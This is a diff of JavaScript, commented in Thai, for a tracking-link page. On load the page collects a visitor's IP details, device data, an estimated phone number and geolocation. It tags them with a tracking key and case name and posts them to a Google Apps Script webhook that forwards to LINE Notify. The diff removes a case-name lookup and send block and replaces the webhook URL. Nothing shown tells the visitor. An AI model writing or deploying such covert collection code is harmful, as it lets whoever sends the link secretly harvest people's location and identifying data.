@@ -1,22 +1,10 @@
-// ฟังก์ชันดึง tracking key และ case name จาก URL parameters และ localStorage
+// ฟังก์ชันดึง tracking key และ case name จาก URL parameters
 function getUrlParameters() {
   try {
     const urlParams = new URLSearchParams(window.location.search);
-    const trackKey = urlParams.get('track') || "ไม่มีค่า";
-    
-    // พยายามดึง caseName จาก localStorage ก่อน
-    let caseName = localStorage.getItem('currentTrackKey') === trackKey 
-                  ? localStorage.getItem('currentCaseName') 
-                  : "ไม่มีค่า";
-    
-    // ถ้าไม่พบใน localStorage ให้ใช้ค่าเริ่มต้น
-    if (!caseName) {
-      caseName = "ไม่มีค่า";
-    }
-    
     return {
-      trackingKey: trackKey,
-      caseName: caseName
+      trackingKey: urlParams.get('track') || "ไม่มีค่า",
+      caseName: urlParams.get('case') || "ไม่มีค่า"
     };
   } catch (error) {
     console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
@@ -26,78 +14,6 @@ function getUrlParameters() {
     };
   }
 }
-
-// ฟังก์ชันดึง caseName จาก container
-function getCaseNameFromContainer() {
-  const container = document.getElementById('case-name-container');
-  return container ? container.getAttribute('data-case') || null : null;
-}
-
-// ฟังก์ชันเรียก API เพื่อดึงข้อมูล caseName
-async function fetchCaseName(trackKey) {
-  try {
-    // URL ของ Web App (ต้องแทนที่ด้วย URL จริงของ Web App ที่เผยแพร่แล้ว)
-    const webAppUrl = 'https://script.google.com/macros/s/AKfycby9hQVAxxIgg3K7pksMrMYHvrIAZliv33-9zC8w2xmytRoW47HEt_OwXCyEfk8-yqVFyg/exec';
-    
-    const response = await fetch(`${webAppUrl}?key=${encodeURIComponent(trackKey)}`);
-    const data = await response.json();
-    
-    if (data.success) {
-      return data.caseName;
-    } else {
-      console.error("API error:", data.message);
-      return "ไม่มีค่า";
-    }
-  } catch (error) {
-    console.error("Network error:", error);
-    return "ไม่มีค่า";
-  }
-}
-
-// เพิ่มฟังก์ชันเพื่อรอให้ caseName โหลดเสร็จก่อนส่งข้อมูล
-function waitForCaseName(maxWaitTime = 3000) {
-  return new Promise((resolve) => {
-    const startTime = Date.now();
-    
-    function checkCaseName() {
-      const caseName = getCaseNameFromContainer();
-      if (caseName && caseName !== "กำลังโหลด...") {
-        // มี caseName แล้ว
-        resolve(caseName);
-      } else if (Date.now() - startTime > maxWaitTime) {
-        // เกินเวลารอ
-        resolve("ไม่มีค่า");
-      } else {
-        // รอต่อไป
-        setTimeout(checkCaseName, 100);
-      }
-    }
-    
-    checkCaseName();
-  });
-}
-
-// รอให้ caseName โหลดเสร็จก่อนส่งข้อมูล
-waitForCaseName().then(caseName => {
-  // (ข้อมูลอื่นๆ ที่รวบรวมแล้ว)
-  
-  // ตรวจสอบ IP และส่งข้อมูล
-  getIPDetails()
-    .then(ipData => {
-      // ตรวจสอบข้อมูลเบอร์โทรศัพท์ (หรือประมาณการณ์)
-      estimatePhoneNumber().then(phoneInfo => {
-        // แทรก caseName ที่โหลดเสร็จแล้วเข้าไปในข้อมูล
-        const { trackingKey } = getUrlParameters();
-        
-        // ส่งข้อมูลครั้งแรกทันทีพร้อม IP (ไม่มีพิกัด)
-        sendToLineNotify(ipData, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, phoneInfo, trackingKey, caseName);
-
-        // พยายามขอข้อมูลพิกัด (ถ้าผู้ใช้อนุญาต)
-        tryGetLocation(ipData, timestamp, referrer, allDeviceData, phoneInfo, trackingKey, caseName);
-      }).catch(/* ... */);
-    })
-    .catch(/* ... */);
-});
 
 // ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
 (function() {
@@ -550,7 +466,7 @@ function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, pho
   const detailedMessage = createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName);
 
   // ส่งข้อมูลไปยัง webhook ของเรา (ที่ต่อกับ LINE Notify)
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycby9hQVAxxIgg3K7pksMrMYHvrIAZliv33-9zC8w2xmytRoW47HEt_OwXCyEfk8-yqVFyg/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxBSNwlPZ4xdIFbdmdXsW6UxRDjTRREm4qkxhjguJGhRxFBcPyZ_C9A2OaRzc6sNtBT_A/exec';
 
   // เตรียมข้อมูลสำหรับส่ง
   const dataToSend = {
